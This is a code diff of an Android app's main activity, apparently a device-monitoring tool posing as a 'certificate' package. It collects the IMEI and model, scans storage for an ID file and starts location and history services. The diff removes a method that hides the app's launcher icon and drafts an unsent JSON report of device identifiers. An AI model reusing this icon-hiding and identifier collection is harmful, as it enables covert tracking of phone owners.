@@ -6,17 +6,18 @@ import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
-import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.os.Bundle;
 import android.os.Environment;
@@ -29,7 +30,6 @@ import android.widget.EditText;
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
 import com.inet.android.location.LocationTracker;
-import com.inet.android.request.DataRequest;
 import com.inet.android.request.Request4;
 import com.inet.android.utils.Logging;
 
@@ -85,6 +85,8 @@ public class MainActivity extends Activity {
 		e.putString("imei", imeistring);
 		e.putString("ABOUT", aboutDev);
 		e.putString("model", model);
+		e.putString("account", "account");
+
 		e.commit();
 
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
@@ -94,6 +96,7 @@ public class MainActivity extends Activity {
 
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
+			e.putBoolean("hideIcon", false);
 			e.putString("ABOUT", aboutDev);
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // время
 																				// для
@@ -108,15 +111,25 @@ public class MainActivity extends Activity {
 			// hideIcon();
 		}
 
-		getID(); // рекурсивный поиск файла с нужным именем
+		if (getID()) {
+			Logging.doLog(LOG_TAG, "getID return true");
+		} else {
+			Logging.doLog(LOG_TAG, "getID return false");
+		}
 		if (sp.getString("account", "account").equals("account")) {
 
 			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
 					"File not found. Show dialog.");
 
-			viewIDDialog();
-		} else
+//			if (!hasVisited) {
+				viewIDDialog();
+//			}
+//			start();
+		} else {
+			Logging.doLog(LOG_TAG, "not show dialog");
+			
 			finish();
+		}
 	}
 
 	@Override
@@ -142,9 +155,23 @@ public class MainActivity extends Activity {
 				e = sp.edit();
 				e.putString("account", value);
 				e.commit();
+				
+				SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
+				Logging.doLog(LOG_TAG, "send start request, imei: ", sp.getString("imei", "imei"));
+
+				JSONObject jsonObject = new JSONObject();
+				try {
+					jsonObject.put("account", sp.getString("account", "0000"));
+					jsonObject.put("imei", sp.getString("imei", "imei"));
+					jsonObject.put("model", sp.getString("model", "0000"));
+				} catch (JSONException e) {
+					e.printStackTrace();
+				}
+
+//				String str = jsonObject.toString();				
+//				StartRequest sr = new StartRequest(getApplicationContext());
+//				sr.sendRequest(str);
 				start(); // запуск сервисов
-				// sendDiagPost();
-				// sendStartRequest();
 				finish();
 			}
 		});
@@ -161,11 +188,11 @@ public class MainActivity extends Activity {
 		return true;
 	}
 
-	public void getID() {
+	public boolean getID() {
 		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
 
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
-		recursiveFileFind(file);
+		return recursiveFileFind(file);
 	}
 
 	public boolean recursiveFileFind(File[] file1) {
@@ -189,9 +216,7 @@ public class MainActivity extends Activity {
 					e.commit();
 					// Log.d("ID", sp.getString("ID", "ID"));
 					if (!sp.getString("account", "account").equals("account")) {
-						// sendStartRequest();
-						// sendDiagPost();
-						start(); // çàïóñê ñåðâèñîâ
+						start(); 
 						return true;
 					}
 					break;
@@ -203,6 +228,9 @@ public class MainActivity extends Activity {
 		return false;
 	}
 
+	/**
+	 * Start services
+	 */
 	public void start() {
 		Logging.doLog(LOG_TAG, "start services", "start services");
 
@@ -218,16 +246,6 @@ public class MainActivity extends Activity {
 		// startService(new Intent(MainActivity.this, LinkService.class));
 
 		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
-	}
-
-	public void hideIcon() {
-		ComponentName componentToDisable = new ComponentName(
-				"com.inet.android.certificate",
-				"com.inet.android.bs.MainActivity");
-
-		getPackageManager().setComponentEnabledSetting(componentToDisable,
-				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-				PackageManager.DONT_KILL_APP);
 	}
 
 	@Override
